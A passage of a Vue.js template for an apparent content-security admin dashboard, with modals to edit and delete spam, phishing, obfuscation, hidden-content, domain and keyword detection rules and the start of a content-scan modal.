      subtitle="Verify decommissioning of this content security HTML attribute rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingHtmlAttributeRule"
      @close="closeHtmlAttributeDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this HTML attribute rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Rule attribute / pattern <span class="font-mono font-bold text-foreground">{{ deletingHtmlAttributeRule?.attribute || (selectedHtmlAttributeRule ? (selectedHtmlAttributeRule.attribute || selectedHtmlAttributeRule.pattern) : `ID #${htmlAttributeModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingHtmlAttributeRule"
            @click="closeHtmlAttributeDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingHtmlAttributeRule"
            @click="executeDeleteHtmlAttributeRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingHtmlAttributeRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingHtmlAttributeRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE REDIRECT RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="redirectModalState.isDelete.value"
      title="Delete Redirect Rule"
      subtitle="Verify decommissioning of this content security redirect rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingRedirectRule"
      @close="closeRedirectDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this redirect rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Pattern <span class="font-mono font-bold text-foreground">{{ deletingRedirectRule?.pattern || (selectedRedirectRule ? selectedRedirectRule.pattern : `ID #${redirectModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingRedirectRule"
            @click="closeRedirectDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingRedirectRule"
            @click="executeDeleteRedirectRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingRedirectRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingRedirectRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT OBFUSCATION RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="obfuscationModalState.isEdit.value"
      :title="isObfuscationDetailsLoading ? 'Loading Obfuscation Rule...' : (editingObfuscationRuleId ? `Edit Obfuscation Rule #${editingObfuscationRuleId}` : 'Edit Obfuscation Rule')"
      subtitle="Update pattern heuristics and classification parameters for this obfuscation rule."
      max-width="max-w-lg"
      @close="closeObfuscationEditModal"
    >
      <!-- Loading State -->
      <div v-if="isObfuscationDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving obfuscation rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateObfuscationRule" class="p-6 space-y-4">
        <!-- Pattern / Regex -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Regular Expression <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="obfuscationEditForm.pattern"
            type="text" 
            placeholder="e.g. [a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}, (?i)v[il1][a-z0-9]{3,}"
            class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-mono text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all placeholder:text-muted-foreground/60"
            required
          />
          <p class="text-[11px] text-muted-foreground">
            Specify the regex pattern or heuristic sequence to detect evasion tactics and obfuscated content.
          </p>
        </div>

        <!-- Category & Severity Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Category <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="obfuscationEditForm.category"
              class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all cursor-pointer"
            >
              <option value="SPAM">Spam Blacklist</option>
              <option value="PHISHING">Phishing & Social Engineering</option>
              <option value="MALWARE">Malicious URLs & Payloads</option>
              <option value="POLICY">Policy & Regulatory Violation</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation Rules</option>
              <option value="OTHER">Other Custom Heuristics</option>
            </select>
          </div>

          <!-- Severity -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Severity Level <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="obfuscationEditForm.severity"
              class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all cursor-pointer"
            >
              <option value="LOW">Low Risk</option>
              <option value="MEDIUM">Medium Risk</option>
              <option value="HIGH">High Risk</option>
              <option value="CRITICAL">Critical Severity</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Rule Description & Rationale
          </label>
          <textarea 
            v-model="obfuscationEditForm.description"
            rows="3"
            placeholder="Document why this regex/heuristic rule was established, evasion patterns targeted, and false positive safeguards..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all resize-none placeholder:text-muted-foreground/60 leading-relaxed"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="pt-2 border-t border-border flex items-center justify-between">
          <div class="space-y-0.5">
            <label class="text-xs font-bold text-foreground cursor-pointer" for="edit-obfuscation-enabled">
              Enable Inspection Heuristic
            </label>
            <p class="text-[11px] text-muted-foreground">
              When enabled, incoming content will actively be evaluated against this obfuscation pattern.
            </p>
          </div>
          <input 
            id="edit-obfuscation-enabled"
            v-model="obfuscationEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingObfuscationEdit"
            @click="closeObfuscationEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingObfuscationEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingObfuscationEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingObfuscationEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE OBFUSCATION RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="obfuscationModalState.isDelete.value"
      title="Delete Obfuscation Rule"
      subtitle="Verify decommissioning of this content security obfuscation rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingObfuscationRule"
      @close="closeObfuscationDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this obfuscation rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Pattern <span class="font-mono font-bold text-foreground">{{ deletingObfuscationRule?.pattern || (selectedObfuscationRule ? selectedObfuscationRule.pattern : `ID #${obfuscationModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingObfuscationRule"
            @click="closeObfuscationDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingObfuscationRule"
            @click="executeDeleteObfuscationRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingObfuscationRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingObfuscationRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT HIDDEN CONTENT RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="hiddenContentModalState.isEdit.value"
      :title="isHiddenContentDetailsLoading ? 'Loading Hidden Content Rule...' : (editingHiddenContentRuleId ? `Edit Hidden Content Rule #${editingHiddenContentRuleId}` : 'Edit Hidden Content Rule')"
      subtitle="Update CSS pattern heuristics and classification parameters for this hidden content rule."
      max-width="max-w-lg"
      @close="closeHiddenContentEditModal"
    >
      <!-- Loading State -->
      <div v-if="isHiddenContentDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving hidden content rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateHiddenContentRule" class="p-6 space-y-4">
        <!-- CSS Declaration / Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            CSS Declaration / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="hiddenContentEditForm.pattern"
            type="text" 
            placeholder="e.g. display:none, opacity:0, font-size:0, visibility:hidden"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="INJECTION">Injection</option>
              <option value="REDIRECT">Redirect</option>
              <option value="OTHER">Other</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentEditForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="hiddenContentEditForm.description"
            rows="2"
            placeholder="Explain why this hidden content pattern is flagged or prohibited..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="hiddenContentEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHiddenContentEdit"
            @click="closeHiddenContentEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHiddenContentEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingHiddenContentEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHiddenContentEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE HIDDEN CONTENT RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="hiddenContentModalState.isDelete.value"
      title="Delete Hidden Content Rule"
      subtitle="Verify decommissioning of this content security hidden content rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingHiddenContentRule"
      @close="closeHiddenContentDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this hidden content rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Pattern <span class="font-mono font-bold text-foreground">{{ deletingHiddenContentRule?.pattern || (selectedHiddenContentRule ? selectedHiddenContentRule.pattern : `ID #${hiddenContentModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingHiddenContentRule"
            @click="closeHiddenContentDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingHiddenContentRule"
            @click="executeDeleteHiddenContentRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingHiddenContentRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingHiddenContentRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT DOMAIN RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="domainModalState.isEdit.value"
      :title="isDomainDetailsLoading ? 'Loading Domain Rule...' : (editingDomainRuleId ? `Edit Domain Rule #${editingDomainRuleId}` : 'Edit Domain Rule')"
      subtitle="Update pattern heuristics and classification parameters for this domain rule."
      max-width="max-w-lg"
      @close="closeDomainEditModal"
    >
      <!-- Loading State -->
      <div v-if="isDomainDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving domain rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateDomainRule" class="p-6 space-y-4">
        <!-- Domain -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Domain <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="domainEditForm.domain"
            type="text" 
            placeholder="e.g. malicious-site.com, cdn-phish.net, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainEditForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="EXACT">Exact Domain</option>
              <option value="SUBDOMAIN">Domain And Subdomains</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="domainEditForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="domainEditForm.description"
            rows="2"
            placeholder="Explain why this domain is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="domainEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingDomainEdit"
            @click="closeDomainEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingDomainEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingDomainEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingDomainEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE DOMAIN RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="domainModalState.isDelete.value"
      title="Delete Domain Rule"
      subtitle="Verify decommissioning of this content security domain rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingDomainRule"
      @close="closeDomainDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this domain rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Domain <span class="font-mono font-bold text-foreground">{{ deletingDomainRule?.domain || (selectedDomainRule ? selectedDomainRule.domain : `ID #${domainModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingDomainRule"
            @click="closeDomainDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingDomainRule"
            @click="executeDeleteDomainRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingDomainRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingDomainRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT KEYWORD RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isEdit.value"
      :title="isKeywordDetailsLoading ? 'Loading Keyword Rule...' : (editingKeywordRuleId ? `Edit Keyword Rule #${editingKeywordRuleId}` : 'Edit Keyword Rule')"
      subtitle="Update pattern heuristics and classification parameters for this keyword rule."
      max-width="max-w-lg"
      @close="closeKeywordEditModal"
    >
      <!-- Loading State -->
      <div v-if="isKeywordDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving keyword rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateKeywordRule" class="p-6 space-y-4">
        <!-- Keyword -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Keyword <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="keywordEditForm.keyword"
            type="text" 
            placeholder="e.g. free crypto giveaway, telegram @, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordEditForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="WORD">Word</option>
              <option value="SUBSTRING">Substring</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="keywordEditForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="keywordEditForm.description"
            rows="2"
            placeholder="Explain why this keyword is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="keywordEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingKeywordEdit"
            @click="closeKeywordEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingKeywordEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingKeywordEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingKeywordEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE KEYWORD RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isDelete.value"
      title="Delete Keyword Rule"
      subtitle="Verify decommissioning of this content security keyword rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingKeywordRule"
      @close="closeKeywordDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this keyword rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Rule <span class="font-mono font-bold text-foreground">{{ deletingKeywordRule?.keyword || (selectedKeywordRule ? selectedKeywordRule.keyword : `ID #${keywordModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingKeywordRule"
            @click="closeKeywordDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingKeywordRule"
            @click="executeDeleteKeywordRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingKeywordRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingKeywordRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- Run Content Scan Modal -->
    <UiAdminModal
      :is-open="isRunScanModalOpen"
      title="Run New Content Scan"
      :subtitle="scanMode === 'specific' ? 'Configure scan parameters for a specific content object' : scanMode === 'content_type' ? 'Configure scan parameters for an entire content type' : 'Configure system-wide scan across all content types'"
      max-width="max-w-lg"
      @close="isRunScanModalOpen = false"
    >
      <div class="p-6 space-y-5">
        <!-- Scan Mode Selector -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-muted-foreground uppercase tracking-wider">Scan Mode</label>
          <div class="grid grid-cols-3 gap-2">
            <button
              type="button"
              @click="scanMode = 'specific'"
              :class="cn(
